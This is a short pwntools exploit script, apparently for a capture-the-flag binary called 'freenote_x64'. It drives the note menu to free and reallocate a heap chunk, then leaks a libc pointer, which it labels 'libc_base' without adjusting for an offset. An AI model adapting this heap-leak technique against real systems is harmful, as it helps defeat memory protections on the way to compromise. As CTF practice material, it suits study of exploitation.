#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./freenote_x64")
    elf = ELF("./freenote_x64")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

else:
    io = remote("localhost", 9999)
    elf = ELF("./freenote_x64")
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def DEBUG():
    raw_input("DEBUG: ")
    gdb.attach(io)

def listNote():
    io.sendlineafter("choice: ", "1")
    
def newNote(length, content):
    io.sendlineafter("choice: ", "2")
    io.sendlineafter("note: ", str(length))
    io.sendlineafter("note: ", content)

def editNote(idx, length, content):
    io.sendlineafter("choice: ", "3")
    io.sendlineafter("number: ", str(idx))
    io.sendlineafter("note: ", str(length))
    io.sendlineafter("note: ", content)

def delNote(idx):
    io.sendlineafter("choice: ", "4")
    io.sendlineafter("number: ", str(idx))

if __name__ == "__main__":
    newNote(0x80, cyclic(0x80))
    newNote(0x80, cyclic(0x80))
    delNote(0)

    newNote(8, "1234567")
    DEBUG()
    listNote()
    libc_base = u64(io.recvuntil("\x7f")[-6: ].ljust(8, "\x00"))
    info("libc_base -> 0x%x" % libc_base)
    io.interactive()
    io.close()
